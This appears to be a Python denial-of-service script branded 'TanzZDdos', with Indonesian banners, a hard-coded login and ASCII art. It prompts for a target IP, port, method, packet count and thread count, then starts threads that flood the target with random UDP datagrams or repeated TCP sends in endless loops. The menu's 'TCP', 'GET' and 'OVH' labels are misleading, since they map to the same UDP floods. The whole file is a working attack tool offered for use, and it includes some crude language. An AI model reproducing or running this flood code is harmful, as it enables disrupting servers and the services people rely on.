
#.No Rename Bangst Rinem Yatimmm
#.Abusee?? Server Otw Gosong
import random
import socket
import threading
import time
import os,sys
import random, socket, threading
import os
import getpass

print("""
\033[0;32m
\033[0;32m NO ABUSE YAH KIDS NO RENAME
\033[0;32m
\033[0;32m TANDI GANTENG CUYY UBAH SALAH SATU EROR !!! 
\033[0;32m
\033[0;32m OTW DI ENTOTT MA GUA KLO ABUSEE YAHH !!
\033[0;32m 
\033[0;32m 
""")


username = str(input("\033[33m{TanzZ] \033[93mUsername:"))
password = str(input("\033[33m[TanzZ] \033[93mPassword:"))
if password == "TanzZ" and username == "TanzZ":
    print ("Logged in as admin")
    time.sleep(2)

else:
    print ("Password Salah. Coba Lagi")
    time.sleep(20)

os.system("clear")
print("\033[92mConnecting To Server [\033[97m•\033[92m]")
time.sleep(0.5)

os.system("clear")
print("Connecting To Server [\033[97m••\033[92m]")
time.sleep(0.5)

os.system("clear")
print("Connecting To Server [\033[97m•••\033[92m]")
time.sleep(0.5)

os.system("clear")
print("Connecting To Server [\033[97m••\033[92m]")
time.sleep(0.5)

os.system("clear")
print("Connecting To Server [\033[97m•\033[92m]")
time.sleep(0.5)
os.system("clear")


print("""
───▄▀▀▀▄▄▄▄▄▄▄▀▀▀▄───   Welcome! to TanzZDdos
───█▒▒░░░░░░░░░▒▒█───   Please Not Abuse Scrip
────█░░█░░░░░█░░█────   HANYA BERSENANG SENANG
─▄▄──█░░░▀█▀░░░█──▄▄─   Made By : TanzZ
█░░█─▀▄░░░░░░░▄▀─█░░█
█▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█
█░░╦─╦╔╗╦─╔╗╔╗╔╦╗╔╗░░█
█░░║║║╠─║─║─║║║║║╠─░░█
█░░╚╩╝╚╝╚╝╚╝╚╝╩─╩╚╝░░█
█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█
  """)
  
print("\033[95m>> CODED : TanzDDOS ") 
print("\033[95m>>>> TOOLS PRIVATE TanzzEsempeh")
print("\033[95m>>>>ABUSSEE TANGGUNG SENDIRI AKIBATNYA            ")
ip = str(input("  \033[0;31mIP: "))
port = int(input(" \033[0;93mPort: "))
choice = str(input(" \033[32mMethods: "))
times = int(input(" \033[0;31mPacket:" ))
threads = int(input(" \033[0;32mThreads: "))
def run():
	data = random._urandom(577)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" TanzZ")
		except:
			print("[!] ERROR SERVER TIME OUT")
			
def run2():
	data = random._urandom(818)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" Attacking the Server !! ")
		except:
			print("[!] Bek Bek Bek Bek Bek Cemass Kau Dekk !!")
			
def run3():
	data = random._urandom(818)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" Attacking the Server !!  ")
		except:
			print("[!] Bek Bek Bek Bek Bek Cemass Kau Dekk !!")
			
def run4():
	data = random._urandom(17)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" YAH DOWN EZZ BANGET SI DEK !! ")
		except:
			print("[!] ERROR SERVER TELAH MATI")
			
def run5():
	data = random._urandom(1872637)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" YAH DOWN EZZ BANGET SI DEK. ")
		except:
			print("[!] ERROR SERVER OFF")

def run6():
	data = random._urandom(146734)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" YAH DOWN EZZ BANGET SI DEK. ")
		except:
			print("[!] ERROR SERVER OFF")

def run7():
    data = random._urandom(818)
    i = random.choice(("[•]","[•]","[•]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Tanzz Tols Nih Dekkk Tutor Ddos ")
        except:
            s.close()
            print("Best DDoS By Tanzz!!!")

def spoofer():
    addr = [192, 168, 0, 1]
    d = '.'
    addr[0] = str(random.randrange(11, 197))
    addr[1] = str(random.randrange(0, 255))
    addr[2] = str(random.randrange(0, 255))
    addr[3] = str(random.randrange(2, 254))
    assemebled = addr[0] + d + addr[1] + d + addr[2] + d + addr[3]
    return assemebled

for y in range(threads):
	if choice == 'UDP':
		th = threading.Thread(target = run)
		th.start()
		th = threading.Thread(target = run2)
		th.start()
		th = threading.Thread(target = run3)
		th.start()
	if choice == 'udp':
		th = threading.Thread(target = run)
		th.start()
		th = threading.Thread(target = run2)
		th.start()
		th = threading.Thread(target = run3)
		th.start()
	if choice == 'TCP':
		th = threading.Thread(target = run)
		th.start()
		th = threading.Thread(target = run2)
		th.start()
	if choice == 'tcp':
		th = threading.Thread(target = run)
		th.start()
		th = threading.Thread(target = run2)
		th.start()
	if choice == 'GET':
		th = threading.Thread(target = run4)
		th.start()
		th = threading.Thread(target = run5)
		th.start()
	if choice == 'get':
		th = threading.Thread(target = run4)
		th.start()
		th = threading.Thread(target = run5)
		th.start()
	if choice == 'OVH':
		th = threading.Thread(target = run4)
		th.start()
		th = threading.Thread(target = run5)
		th.start()
	if choice == 'ovh':
		th = threading.Thread(target = run4)
		th.start()
		th = threading.Thread(target = run5)
		th.start()
else:
		th = threading.Thread(target = run)
		th.start()
		th = threading.Thread(target = run2)
		th.start()
		th = threading.Thread(target = run3)
		th.start()
		th = threading.Thread(target = run4)
		th.start()
		th = threading.Thread(target = run5)
		th.start()
		th = threading.Thread(target = run6)
		th.start()
		th = threading.Thread(target = run7)